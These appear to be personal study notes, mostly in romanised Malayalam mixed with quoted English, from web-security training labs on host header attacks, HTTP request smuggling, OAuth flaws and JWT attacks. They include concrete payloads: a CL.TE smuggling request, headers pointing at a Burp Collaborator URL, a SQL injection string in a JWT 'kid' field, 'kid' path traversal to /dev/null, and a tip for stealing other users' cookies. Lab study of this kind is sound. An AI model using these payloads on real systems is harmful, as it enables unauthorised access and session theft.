14) host: localhost allengil 127.0.0.1  oke itt chyam.ivide lab4 il admin panel local users in acces chyan patum.so host: localhost enn kodukumbol aakunund
15) Companies sometimes make the mistake of hosting publicly accessible websites and private, internal sites on the same server
16) internal networkil nadakuna karyangal oke ip adress ayirikum athinte oke url/path.so athkondan namal lab-5 il ip adress vech bruteforce chyth nokiyath.apol aan manasilakunath oru partical ip vech kerumbol mathrame namuk /admin panel ilek keran patumennath
17) host: collaborator url  koduthit athilek request pokunundengil namal aa request intruderil itt collbaorator url maati ip adress koduth nokuka eg: `192.168.0.0/24`  enit ethengilum ip run chyunundon nokuka
18) REMEMBER : intruderil host header bruteforce chyumbol mukalil ullath untick chyanam ie,`update host header to match target`   ennale burp in manasilaku ee host header namal maati test chyukayanen
19) requst il ulla host headeril enthengilum add chythit send chyuka.athikam error varum.so host header original value kodukuka enit GET / request il ee /  kalanjit aa website inte original url kodukuka(eth page inte request aano aa page il ninum url eduth paster chyuka) enit respone enthanen nokuka - lab6
20)    ==our request -> firwall kadann pokunu -> avide reverseproxy/loadbalancer undakum.ith namude request application ilekano atho internal services ilekano pokendath enn noki angot request ayakum -> so finaly request backend application ilek varum enit ivide nin response thirich ithe vazhiyilude client il varum ok==
21) oru request kitiyal host: internal-ip:80 koduth send adich nokuka ok. 80 mathramalla 8082 angane pala portum itt koduth nokam.oru cache buster aadyam kodukuka enit internal ip koduth portum koduth test chyth nokuka. GET chythit aavunilengil HELP method use chyth nokam ok( HELP /?cb=123 host: 74.6.49.129:8082)
22) GET http://74.6.49.129:8082/ HTTP/1.1   ennum koduth test chyuk
23) host: ../?x=google.com   enn koduth send chyth nokuka.(open redirection testing)
24) GET burpcollaboratorurl koduth nokuka(withuout any slash) enit host original thane koduthnokuka.poll now adikumbol chealapo request angot poyekum
25) referer: http://collaboratorr url koduth nokam
26) x-forwarded-for: collaborator url koduth nokam
27) true-client-ip: collaborator url koduth nokam
28) x-real-ip: collaborator url koduth nokam
29) GET /?a=collaboratorurl&a=collaboratorurl koduth nokam. oru parameter koduth ping kitilengil same name il ulla oru parameter koodi koduth send chyth nokam.ee reethiyi chyth nokumbol ecapsula enna sathanam fetch chyum.encapsula enthanen correct areela
30) reverse proxy il ulla oru feature engandan load balancing.eg: kore clients amazon.com request chyumbol kore request serverilek varum.apol aa load balance chyunathan load balancer aan
31) oru website inte ip kandupidkan oru trick und.ie, host header il burp collaborator client kodukuka enit poll now adikuka apol namuk avide aa website inte ip kitiyekam
32) host header il ip vechoke test chyumbol GET /admin/.. ennath mati just GET /  enn mathram aakiyamathi enn thonunu.enit update host header to match target untick chyuka enit venam attack chyan.result kiti kazhinj namuk pinem GET /admin enoke akkam

==============================================================

 ### HTTP request smuggling :
1) oru request il content-lenth and transfer-encoding header itt test chyuka.aa rand header um server accept chyukayanengil aan ee oru vulnerability undakan ulla chance ullu.satharana ee rand headers undakumbol content-lenth mathrame application accept chyu
2) applications il rand server undakum.front-end , back-end server.ee server varuna request ukal analyze chythitan server/application ilek request send chyuka.so ee server ukale pattikuka ennathan ee smuggling exploitation.ee serverukalil T.E or C.L headers parse chyunathinanusarich namal exploitation undakunu ok
3) ==namal enthengilum extra karyangal ittanalo smuggle chyunath.so aadyam thane namal GET / ...  enonum idanda karyamila.just SMUGGLED enn bodyil kodukuka enit send adikuka.namal smuggle chyan udheshicha sathanam working aakunundon ariyan response code nokiyamathi ie, 404 NOT FOUND.athayath namal enthengilum extra karyam smuggle chyumbol backend ath process chyan nokum apol veruthe SMUGGLED enoke ital backend in enth chyanamenareela so NOT FOUND enn kanikum.athinartham namude smuggled code backend ilek pokunund ennan ok.athayath ee SMUGGLED ennth probably next request il append aayitundakum ok==
4) nammal smuggle chyth append chyuna request il body kodukunilengil ini veran pokuna request il ee smuggled request append aakum. 
5) nammal ingane oru request smuggle chyunu

                                 GET /admin HTTP/1.1
                                 foo: x
ipol nokumbol kanam ee smuggled request il body illa.so next reqeust il append aakum.next request genuine aaya request :

                                    GET / HTTP/1.1
                                    host: innocent.com
so ee request il nammude smuggled request append aakumbol :

                                     GET /admin HTTP/1.1
                                     foo: xGET / HTTP/1.1
                                     host: innocent.com
                                     cookie:....
ennakum.so ee randamathe line(foo: xGET..) server just ingonre chyum apol onnamatheyum moonamatheyum line mathrame noku.angane namuk /admin pathilek pokan patum
5) POST request il mathrame content-length: header undaku.athum body il ulla charecters mathrame kaniku.athayath parameter and its value ie,q=smuggling
6) transfer-encoding: chunked enn request il undayal 0 (zero) enn kanunath vere body il karyangal kodukam.athyath content-length: 5 ennanengil 5 in shesham enthengilum vannal ath vere request aayan backend kanuka.but ivide transfer-encodingil zero verunathvere content length kootam
7) content-length: 0 ittit namal body il vere enthengilum koduthal ath puthiya request aayi backend kanum
8) content-length um transfer-encoding um orumich request il vannal content-lenth automatic aayi ignore chyum.athan korachudi safe
9) oru GET / request edukuka  enit athile aadyathe rand line ozhichu baaki ellam remove chyuka ie, path and host:  header ozhich. enit GET ennath POST aakuka.karanam POST Il mathrame body undaku.ini host: header in thazhe aayi ingane kodukuka :

POST / HTTP/1.1 
Host: your-lab-id.web-security-academy.net 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 6 
Transfer-Encoding: chunked 
                      
0 
                      
G
6) ivide 0 kk sesham thazhe veruthe line ittathala.ivide request il chunked encoding ullathkond body il ethra bytes unden kanikanam.so ivide zero bytes aan.so zero aayalum 5 aayalum ath next line il kanikanam.so ivide zero aayath kond next line il onum undakan padila.enthengilum undayal zero bytes alla ennartham.pine content-length pole `\r\n`  onum bytes kanakaiila.so charecters in mathrame bytes kanakaku.content-lenth aayirunengil 0`\r\n`  okke aayi namal kanendi vannene apol bytes inte ennam kodum.but chunked il angane onum ila
7) content-length inte bytes correct manasilakanamengil `\r` and `\n` manasilkanam. `\r` ennal carriage return aan.athayath `\r` iital namude type chyuna cursur beginingilek pokum eg: 
  `print("Hello world")  print("hello \rworld")`  ivide namal result nokiyal  :
      hello world
      world 
  enn kanam. adyathe normal hello world print aayi.but randamath ullathil hello illa karanam nammal `\r`  use chythathkond namude type chyuna cursor automatic aayi line inte beginingilek poi athukond ini athinshesham ullath mathrame kaniku

ini namuk `\n`  enthanen nokam. `\n`  ennal new line aan. so `print("hello\nworld")`  enn koduthal :
                hello
                world       enn varum
ini main oru sathanam und CRLF athayath `\r\n`  orumich varunathan ith.windows il oke oru text file il ith undakum.naked eye il ith kanila.athyath oru line ile etavum last aayi `\r\n`  automatic aayi undakum. for example   :
                                               a
                                               b
                                               c
ingnae namla oru text file il ittal sherikum systethil save aakunath :
                                               a`\r\n`           
                                               b`\r\n`
                                               c`\r\n
8) so ini point 5) nok.athil zero , new line , G enn body il kidakunath kanam. so 0 enn varumbol sherikum 0`\r\n`  ennan varuka.so athinartham `0+\r+\n` = 3 bytes athupole athin shesham oru empty new line kanam.athin sesham G yum.so G varanamengil aa new line namal consider chyanam so empty line il `\r+\n` = 2bytes.ini adutha line il G mathrame ullo athupole athin sehsam vere bytes onum ila athupole next line um illa so g = 1 bytes.so total 3+2+1=6bytes varum content-length aayit.NOTE: G kk shesham vere oru empty line thazhe undayirunengil `G\r\n`  enn vanene
9) 1-9 vere matharame chunked il kodukan padulu.10 muthal hex enoded aayitan kodukendath ok
10) lab 2 il front end server chunked encoding aan nokunath.so 0 kk sesham thazhe aayi rand empty line idanam
11) content-lenth: 10  aanengil namuk 15,20...  athayath 10 kooduthal enth number venamengilum kodukam
12) -   Include `\r\n\r\n` following final 0. athayath epozhum 0 kk shesham rand empty line idanam ok
13) namal oru pravisham send adichit 200OK varum pinem send adichit 200OK thane vanal athinartham backend il entho filtering nadakunund ennan ok
14) namuk smuggling request undakumbol main aayi venda headers aan - content-type.content-length,transfer-encoding.pine connection: keep-alive um upayogikam
15) request smuggling kandupidikanulla trick njan main page il paranjitund ath poi vaik
16) Lab-4 ile payload nok.avide 0 kk shesham oru empty line ullu.so ente nigamanam vech nokiyal oru reqeust inte avasanam 0  mathramayi varumbol mathramayirikum rand empty line undavuka enn thonunu
17) ==NOTE: front-end server content-lenth support chyumengil namal correct aayi lenth specify chyanam allengil namuk "read timeout" enna error varum.CL support chyunilnegil namuk legth kooduthal kodukam. athupole back-end server content-lenth mathram support chyumbozhan nammal repeater il content-lenth untick chyunath.athupole front-end chunked support chyumbol mathramanen thonunu namal 0 kk shesham rand empty line iduka enn thonun==
18) nammal namude attack nadathumbol petten chyanam.karanam mattu users inte request varumbol chelapo namude attack maryathak aavanamenila.so kore pravisham try chyanam
19) if oru application nte front-end server access control restriction use chyunengil authorization ulla users in mathrame particular request ayakan patu.angane ullapol aa user ayakuna baaki request onum chelapo back end check chyukapolum chyanamenila.so avide oke smuggling test chyanam
20) enik thonunath host: header namal oru request il koduthal pine content-type , content-lenth um kodukanamenan thonunu areela.lab-5 il namal ith randum koduthapol duplicate header enna error poiyirunu or bypass chyan patiyirunu
21)                   5
						abcde
						0


ingane vanal (5+/r+/n)+(abcdef+/r/n)+(0+/r+/n)+/n+/n   = 15 .ingane aan content-lenth kootuka. last rand empty line /n+/n enn kandal mathi.ingane chinthichal mathi sherikum engane aanen areela.sambavam namuk length kitiyapore.ath kiti ok
22) chela applications ile front-end server extra headers oke request il add chyum back-end server ilek ayakunathin mumbayit.so namuk ariyila ath enthoke aanen.so namude smuggled request il aa headers add chythilengil namude attack nadakila.so namuk ariyanam enthoke changes aan request il front-end varuthunathen.athin oru technique aan ethengilum oru POST req eduth athile parameter il namal kodukuna value reflect aakunundon nokanam.angane reflect aakuenengil aa parameter il namude smuggled request idanam apol namuk kanan patum enthoke changes namude request il vannu enn ok.NOTE: ingane chyumbol namuk areela content-lenth ethra aanen.kooduthal ittal read time out error varum. so manually oro number aayi test chyuka.ennale namuk full request nokan patu
23) namuk mattu users inte request steal chyam(comments idunath).requestil cookie oke undakum.so aa cookie comment chyunathpole
24) chela samayangalil servers clientumayi(browser) authenticate chyunath certificate vechitan. This certificate contains their "common name" (CN), which should match their registered hostname. The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain
25) namal oru page il keri enit aa page il thane next page ilek pokanulla button undakum.apol sathanran namal athil redirection undonan check chyar.ennar athin pakaram aa same path name il namude exploit server il oru path undaki oru js file aaki xss trigger chyan patumon nokam-lab11
26) In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users. -   In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
27) Remember to terminate the smuggled request properly by including the sequence `\r\n\r\n` 
28) HTTP/1.1 text based aayath kond ella line ilum `\r\n`  undakum.so athil CRLF injection nokumbol namal`\n`  vech mathram test chythamathi.pakshe HTTP/2 binary format il aayathkond oru headers avasanikunathum ithypole `\r\n`  alla.so namuk `\n`  um athupole `\r\n`  itum CRLF test chyth nokam
29) chela samayam front-end server http dowgrading oke nala reethiyil chythalum chelapo headers sanitize chyyanamenila.so namuk repeater il pythoya header koduth `\r\n`  oke itt koduthit send chyth test chyth nokam.404 vanal namude headers process chyan sramichu ennan artham.ingane chyumbol server process chyan sramikunu engil ithine CRLF injection enn parayum
30) chela samayam front-end um back-endum transfer-encoding avoid chyum.athupole chelapo back-end content-length um ignore chyum.so content-length ignore chyuka enn paranjal content-lenth: 0  pole thane aan - lab15

                 
31)  
                
				 TE.CL and CL.TE // classic request smuggling
                 H2.CL and H2.TE // HTTP/2 downgrade smuggling   
                 CL.0 // content-lenth:0 varunath   
                 H2.0 // implied by CL.0  (downgrading chythitulla exploit CL.0 pole)
                 0.CL and 0.TE // unexploitable without pipelining 
Websites that downgrade HTTP/2 requests to HTTP/1 may be vulnerable to an equivalent "H2.0" issue if the back-end server ignores the `Content-Length` header of the downgraded request.
32)             

              POST /b/ HTTP/2   
              Host: www.amazon.com        HTTP/2 200 OK   Content-Type: text/html                       
              Content-Length: 23      
              GET /404 HTTP/1.1   
              
              X: XGET / HTTP/1.1           HTTP/2 200 OK   Content-Type: image/x-icon
              Host: www.amazon.com   

ee request um athinte  response um nok.ivide `X: XGET`  enn kanuna line nok.enik thonunath ingane oru header aaki athnok puthiya oru requets append aakunengil ie,ivide X: XGET / ennath aa request application accept chyum enn thonunu.pakaram veruthe `abcdGET / HTTP/1.1`  ennanengil error varumen thonun
33) rand request group aaki send chyuna samayath request inte (mainly first request inte) connection: close aanengil ath maati keep-alive koduth nokuka.athikavum oru request in athinte response koduthal server aa connection close aakum apol namuk next request athinte koode kodukan patanamenila-lab15
34) request smuggling ine desync ennum parayumen thonunu
35) Web servers can sometimes be encouraged to respond to `POST` requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, this results in a `client-side desync` vulnerability.
36) namal request smuggling chyumbol content length correct kitathond timeout error varum. angane varumbol connection close aakum server.==so chela samayam backend server timeout error vanalum back-end connection close chyila.so angane oke ulla samayam namuk pause based request smuggling oke try chyam==
37) trubo intruder tool Some server-side pause-based desync vulnerabilities kandupidikan best aan.ithine pati njan main page il type chythitund last aan ee topic varunath
38) Github il smuggler enna tool und ->`python3 smuggler.py -u http://google.com/endpoint` koduth search chyth nokuka
39) 

==============================================================

### OAuth 2.0 authentication :
1) oAuth is build for authorisation
2) authorisation code flow-> ivide aadyam john enn user interview pro ilek pokum apol avark john inte calender nokanam ennale john inte free time ariyan patum.so john inte request varumbol interview-pro nere john inte google calender ilek ayakum(aa ayakunda link il korach parameters undakum athil onnan `code`.so john google sign in chyanam.apol google oru redirection link tharum.athil code undakum.so ee code nere interview-pro yude server ilek pokum.enit interview-pro server ee kitiya code+john user id+secret eduth nere google ilek ayakum apol google oru access token interview-pro kk kodukum.apol mathraman interview-pro enna site in john inte calender check chyan patuka. ingnane chyumbol interview-pro nn john inte google il avante username,passwd kodukathe thane keran patum
3) implicit flow->ithum authorisation code flow thane aan.pakshe ivide `code`  undakila pakaram direct aayi token kitum angane entho aan.utubil nokiyal mathi
4) ==authorisation code grant type il aadyam client application authorisation code in vendi auth service in request ayakum enit auth service authorisation code client application ayachkodukum.ee code client app in kiti kazhiyumbol aan access token vendi veendum client application auth service in oru POST request vazhi request ayakuka.ithinu shehsam nadakuna commiunication server to server aan so attacker in onum chyan patula. pakshe implicit grant type il direct client application aadyam thane access token auth service il ninum kitunu.allathe adyam authorisation code pine access token angnane illa.so authorisation code grant type inekalum easy aan.implicit il user consent permission kodukumbol thane access token kitunu.pakshe authorisation code grant type il user consent kodukumbol authrisation code aan send aakuka allathe access token alla.so ithukodan authorisation token kurach koodi secure aanen parayan karanam==
5) Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application
6) authentication um oAuth use chyum.athayath namal oru appil sign up chyumbol namude social account details kanikum like gmail.so namal namude gmail account select chyumbol client application aa gmail inte oAuth service il poi namude details in vendi request ayakum angane namude username , email oke edukum
7) main page il aan main points oke ullath so ath nokiko
8) oauth service use chyuna samayath url il `state`  parameter illengil athil CSRF attack nadan patum-lab2
9) Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request.If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.
10) /auth enn aadyam kanunathayirikum oauth service inte starting(ie,oath login flow) request enn thonunu.ath vazhi namuk ithinte starting manasilakam line /auth?client_id=lskdjfl... .ath kazhinjit ee process theerunath /authenticate enna request ilude aan.so athi kzhinjal  GET /  varum athayath namal namude website ilek redirect aayirikunu.means oauth process kazhinjirikunu
11) redirect_uri parameter il directory tranversal test chyam. ingane test chyumbol aa website il ulla oru real page thane idan sramikuka ie, /../post?postId=1.adayath one folder up ilek pokumbol website inte url mathrame ullu.so ath kondan post path work aakunath.athava rand page up aanengil /../../ enn idanam ok -lab4
12) With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly
13) OAuth was not initially designed with authentication in mind; it was intended to be a means of delegating authorizations for specific resources between applications.However, many websites began customizing OAuth for use as an authentication mechanism. To achieve this, they typically requested read access to some basic user data and, if they were granted this access, assumed that the user authenticated themselves on the side of the OAuth provider.
14) njn paranjirunu auth service start chyuna request athikavum thudangunath /auth/... enna request ilude aayirikum.so ee request ile host il nokiyal kanam auth server inte hosname aayirikum undavuka.so ee hostname copy chyth new tabil paste chyth athinte path il avasanam configuration path koduth nokuka.athayath documentation il nokiyal kanan patum aa particaula oauth service inte endpoint okke angane search chyth namuk chelapol useful info kandethan patum.ivide last lab il `...my.net/.well-known/openid-configuration`   enn koduth nokumbol namuk pala info yum kanan patunund
15) athkam ella auth request ilum state enna parameter nirbandhamayi use chyum.ee state parameter namude csrf pole aan.ee parameter il unguessable value undakum.so clinet appum auth serviceum future communication nadathumbol authorisation vendi ee parameter use chyum.so athukond thane auth reqeust ukal check chyumbol ee satate paremter use chyunundon noknama.illengil avide oru csrf attack in possibility und
16) NOTE: auth thudangumbol client application -/auth or /authorisation enna endpoint ilek request ayakum.aa requestin marupadi aayi auth service /callback,/authcode,/token(ee endpoint aadyathe request ile redirect_uri enna parameter il kanan patum so valya kashtapadila) ilek authorisation code or access token ayakum(depending on the grant type) .so ee redirect_uri enaa uri auth service in correct aayi validate chyan kazhinjilengil attacker controll chyuna url ilek token/code service ayachekam so ath check chyanam

==========================================================

### JWT attacks :
1) jwt usually start chyunath `ey`  enn string il aan. jwt token moon part aayi moon dot itt seperate chyapetitundakum
2) NOTE: namal chyuna aadyathe labukal ellam symmetrical algorithm use chythitylla labs aanen thonunu karanam.jwt.io il poi jwt paste chyumbol namuk signature part il kanam oru secret key ennath.but pineed ulla lab ukalil nokiyal kanam public key um athupole private keyum kodukanam rand bar kanam.so athinartham athoke assymetrica algorithm aan use chyunathan.ee secret key enn thudare thudare parayunath thane ee private/public key aan ennan ente oru nigamanam
3) Autherisation: bearer `token`   ennum jwt token undakam.so just cookie header il mathram nokaruth ok
4) ==assymetric il njan ithrem kalam vijarichath public key vech encrypt chyunu enit private key vech decrypt chyunu enn.ennal angane alla.rand reethiyilum namuk chyam.ie, publick key vechum encryp chyam athupole private key vechum encrypt chyam.so public key vechan encrypt chythathengil private key vech mathrame decypt chyan patu.athupole private key vechan encrypt chythathengil athinte corresponding public key vech mathrame decrypt chyan patu ok==
5) assymitrical token -> private key vech sign chyum.enit public key vech verify chyum
	symmetrical token -> oru same key vech thane sign chyum, athe key vech thane verify chyum
	so oru application RS256 enna assymetric token use chyunengil ath namal change chythit HS256 polulla symmetric token aaki namal thane key koduth exploit chyan patumon nokuka
3) oru user ine patiyulla ella datayum ee jwt token il undakum like session token
4) JWT is just for authorisation not for authentication.with authentication what we are doing is we take a username and a password and autheticate it to make sure that username and password is correct.its like logging a user in but authorisation is actually makign sure that the user that sends request to the server is the same user that actually logged in during the authentication process.normally we check authorisation is by using `sesssion`  ie,session token inside cookie header.so ini next time user request send chyumbol server ee session cookie nokum athil user ine info undakum apol server in manasilakum ith ayal thane aan.so authorise chyum
5) But in JWT, instead of actuallu using the session cookie, it usea a web token which is what jwt stands for to do the authorisation.athayath namal username,passwd oke adich login chyuna samayath server namuk session cookie tharunathin pakaram oru json webtoken tharum.athil namude userdetails undakum ath encode chyum.athupole athinte koode oru secret key um undakum.so namal aa token tamper chythalum secret key server il ullathkond tamper chyumbol token complete aayi marum apol server il ulla secret key umayi match chyila.so error varum
6) session cookieyum , JWT ude prathyekath enthenal.session cookie namuk tharumbol namude details server store chyunund.but JWT il server il onum store chyapedunila like user details.so session cookie vech namal request ayakumbol server aa session il ulla details lookup chyunund.but jwt il server il onum store chyunila pakaram client(browser) il aan token store chyapedunath.athkond thane server in namude details oro request nadathumbzhum lookup chyanameniila.aake server store chyunath secret key mathraman
7) header means aa jwt il use chytha algorith,type. payload means athil ulla user details.pine ullath signature aan.athayath ee signature idunath userin kitiya aa token user modify chythitila enn urapp varuthanan.athayath ee signature il header um pine payload undakum.ath randum base 64 aayi encode chythitundakum.athupole secret key um undakum.so matteth randum tamper chyan patiyalum ee secret key attack erinte kayil illengil onum chyan patila
8) ==oru server il aan nammal namude application upload chyunath.so namal ayakuna requests oke server aan handle chyunath.so server load balancer aayum reverse proxy aayum act chyunu. namude ela karyangalum handle chyunath server aan.namude database adakam ellam store chyunath server il aan ok==
9) chelapol oru application onnil kooduthal server undakum.oru bank app in athinte main karyangalk oru server undenn vecho athupole mattu chila karyangalk aayi vere server undenn vecho.apol oru user main bank appil login chyth keri enit matte server il ulla enthengilum access chyumbol session cookie aan use chyunathengil main bank app il avante cookie save chythirikunath.so matte server il kerumbol athil avante cookie store chythirikunila so avan pinem login chyendi varunu ok.bu jwt token aanengil athinte aavisham varunila.karanam namude kayil ulla same secret key mathram use chyth aa appinte different server ilek namuk keram.karanam user information client(browser) ilan store chyuka
10) so kore servers ulla application aanengil jwt use chyunath nallathan.illengil users oro server ilek pokumbolum login chyendivarum
11) namuk kitiya jwt token il double click chythal inpector tab il athinte base64 decode chythath kanam
12) chela applications il secret keys verum weak aayirikum.so namuk ath bruteforce chyth kandupidikan patiyekum
13) oro users inum oro secret key aan kitunath ennan ente ariv.but ivide lab 3 il namude secret key kandupidichit admin enn username matumbol admin aayi marunund.chelapol namuk kitiya secret key mathiyayirikum
14) If the server uses an extremely weak secret, it may even be possible to brute-force this character-by-character rather than using a wordlist.
15) The `kid` (key ID) claim is an optional header claim, used to specify the key for validating the signature.The "n" (modulus) parameter **contains the modulus value for the RSA public key**.athayath kid ennath namal eth publick key aan sign chyan use chyunath enn kandethanayi backend il oru identification vendi idunathan.karanam kore keys undakum so server in areela eth key aanen.so ee identfication parameter vazhi server in manasilakan patum inna public key aan use chythirikunathen .n public keyum aanen thonun value aayi varunath areela
16) The JWT header can contain the Key Id parameter kid. It is often used to retrieve the key from a database or filesystem. ==The application verifies the signature using the key obtained through the kid parameter==. If the parameter is injectable, it can open the way to signature bypass or even attacks such as RCE, SQLi, and LFI.
17) jkw header injection chyuna samayath server jkw parameter header il support chyanam ennale injection chyan patu
18) jku enthinan use chyunath ennal chela token il publick key direct aayi vekila athin pakaram ethengilum oru serveril public keys whitelist aayi vechitundakum.so aa server inte path/url jku enna parameter il aan value aayi vekuka.so oru user ee token vech request nadathumbol server ee jku parameter il ulla pathilek pokum enit avide specify chytha public key vech ee token verify chyum
19) kid parameter il directory traversal chyan patum.so ath test chyth nokuka -> 
    `"kid": "../../path/to/file"`
20) database il username,password mathramall pala karyangalum save chyth vechitundakum.so just login page il matharmalla.pala sthalangalilum namal sqli test chyanam.json web token chelapo server databse il aayirikum save chyth vechitundavuka.so namal kid polula parameter il sqli test chyam.like `"kid": "hello' union select 'a2V5' from information_schema.tables; -- "`  ee a2V5 ennath key ne base64 encode chythirikunathan.so thazhe signature part il poi `key`  enn secret key bar il kodukuka.venengil expiration parameter il("exp")  value kootikodukuka.enit kitiya token eduth copy paste chyth test chyth nokuka ok
21) chela apps il In order to verify the signature, the server uses the `kid` parameter in JWT header to fetch the relevant key from its filesystem.athayath ee kid il ulla value oru file/datase il oke ayirikam.athukondan njan paranjath kid il directory traversa , sql il oke test chyanamen.You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, fetching it returns null. Therefore, signing the token with a Base64-encoded null byte will result in a valid signature
22) generally speaking "kid" enna parameter signature verify chyan use chyuna parameter aan
23) symmetric alogorithathil server thane oru specific key vech aadyam token sign cheyum.pineed varuna request ukal ellam ithe same key vech thane server verify chyum
24) assymetrical algorithathil ivide server oru private key vech ee token sign chyum.enit pineed varuna request ukal ellam ithinte koode ulla public key vechan verify chyuka
25) confusion algorithm enthenal satharana server oru jwt token nte signature verify chyan aayi use chyuna algorithm allathe mattoru algorithm vech server ine kond force chyth verify chyan nokunathan confusion algorith.ie, Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers
26) server symmetric key aan use chyunathengil oru otta key mathrame undaku.so ath server oru password pole safe aayi keep chyanam
27) assymetric key use chyumbol oru private key undakum.so ath safe aayi keep chyanam. athupole publick key um undakum.ath safe ayi keep chyarila servers
28) algorithm confusion attack ennal namal server ine confuse chyikukayan chyunath.athayath matoru algoirithm (like symmetrical) kodukunu.so server athvech signature verify chyunu.ith undakunath jwt libraries il undakuna flows vazhi aan.lab7 inte theroy part nok
29) As with other public-key encryption systems, RSA key exchange involves the sharing of a public key that is derived from the private key at the time of generation. In this type of encryption system, anybody with access to the private key can infer the public key.athayath rsa yude private key ullavark athinte public key athil ninum thane access chyan patumen thonunu
30) Due to the complex mathematical system involved, the opposite (deriving the private key from the public key), is impossible. This is why it is safe to share the public key over the internet to establish a secure connection and begin sharing encrypted data.athayath public key il ninum private key lek convert chyan patila.but private key il ninum public key namuk edukan patum
31) The important thing to remember is that before you can share encrypted data over the internet, it is first necessary to establish a secure connection between the client and the server.

	To do this, a key exchange – called a handshake – must occur so that both parties can agree on the keys that will be used to encrypt the data.

	Currently, there are five different algorithms that clients can use to carry out that key exchange, of which RSA is one. We have included all five algorithms below:

-   **RSA**
-   **Diffie-Hellman**
-   **Elliptic Curve Diffie-Hellman**
-   **Ephemeral Diffie-Hellman**
-   **Ephemeral Elliptic Curve Diffie-Hellman**

32) The RSA key-pair is the name for the public and private keys used by the RSA algorithm. The public RSA key is the encryption key, whereas the private key (which must be kept secret to ensure that only the intended recipient can read the data) is the decryption key.
33) TLS handshake oke nadakuna samayath RSA algorithm oke use chyarundenn
34) enik raju in oru message ayakanamengil ente kayil rajuvinte publick key mathram mathi pakshe raju inte kayil public key um undakum athupole ayacha message encrypted aanalo.so ath decrypt chyan ulla private key um undayirikanam.ith thane aan namude application jwt use chyunath.enik thonunath assymetric algorithm use chyuna samayath namuk secret key use chyenda karyma illan thonunu
35) A PEM certificate from Auth0 is a text file containing a Base 64 encoded public key certificate. This is a common format for public and private keys, and in the context of Auth0, public signing keys are made available via the `https://YOUR_DOMAIN/pem` endpoint.
36) 
### **alg**

 `alg` indicates the type of algorithm used to sign the JWT token. The most commonly used values are _RS256_ and _HS256,_ which stands for _RSA-SHA256_ (asymmetric) and _HMAC-SHA256_ (symmetric), respectively. _RS256 `alg`_  belongs to the _RSA `kty`_  (read the `kty` section below)

### **x5t**

_x5t_ is the _X509_ certificate’s thumbprint. That is the certificate whose private key was used to sign the JWT.

### **kid**

The _`kid`_ id the key id indicating which key was used to sign the JWT token. This field is particularly useful when the public key discovery endpoint supports many keys and we need to know which key was used to sign.

In order to verify the signature of the JWT token, the verifier needs to know the public key of the public /private key pair used to sign the JTW token. Most identity providers expose this information via discovery mechanisms, such as the one below from Microsoft Azure.

### **kty**

If the key type is part of the algorithm family used to sign the JW, RSA and ECare some allowed via `kty`. _RS256_ and _RS512_ are some algorithms (`alg`) that belong to the RSA algorithm family (`kty`)

### **Use**

-   Use the above information — whether the algorithm is used for _**enc**_ encryption or **sig** signing.
    
-   **X5t** and **kid** are explained above
    
-   **n** is a public key component of the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation).
    
-   **e** is a public key component of the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation).
    
-   **x5c** is the x509 certificate chain. 
    
-   _Note: If the algorithm `kty` is EC (elliptic Curve), then the public components are x and y._

37) ivide lab-7 il hint tharunund - You can assume that the server stores its public key as an X.509 PEM file. athayath namuk areela eth file aayitan public key store chythirikunathen so namal ath kandethanam.ivide already hint thanitunund athond kozhapamila
38) X.509 ennath public key certificate inte format aan.**X.509** is a standard format for **public key certificates**, digital documents that securely associate cryptographic key pairs with identities such as websites, individuals, or organizations.Common applications of X.509 certificates include SSL/TLS and HTTPS for authenticated and encrypted web browsing, signed and encrypted email via the S/MIME protocol, code signing, document signing, client authentication, and government-issued electronic ID
39) signature il ulla secret key ille - JWT tokens are digitally signed (the signature part) using the payload content and a secret key. In order to change the content, the secret key is required to generate the signature again, otherwise, the signature will be invalid.
40)  **JSON Web Key Set (JWKS)**

One question arises that how we can get the public key. The JSON Web Key Set (JWKS) is a set of keys that contains the public keys used to verify any JSON Web Token (JWT) issued by the authorization. Most authorization servers expose a discovery endpoint, like `https://YOUR_DOMAIN/.well-known/openid-configuration`. You can use this endpoint to configure your application or API to automatically locate the JSON Web key set endpoint (`jwks_uri`), which contains the public key used to sign the JWT .ivide lab il `/jwks.json`  il pokumbol aan namuk public key kituka or `/.well-known/jwks.json`   enna file il poyalum chelapo public key kitumayirikum.jwt endpoint inte wordlist kitumengil angane on try chyth nok

41) ithil parayunath most of the time namuk public key angane evide ninum kitila ennan.so angane varumbol namuk server tharuna normal jwt undalo ath randenam edukanam.ie, oru pravisham login chyuka enit aa kitiya jwt copy chyuka enit log out aayi pine log in aayi kerumbol puthiya jwt kitum ee randenam vech python script use chyth namuk jwt undakna patumon nokam
42) http request il namal oro header il um test chyunath pole jwt token ile oro parameter ilum namal test chyanam.ie,"email": enna parameter il namal victim inte email koduth nokanam apol entha samvavikuka enn nokanam angane oronum test chyuka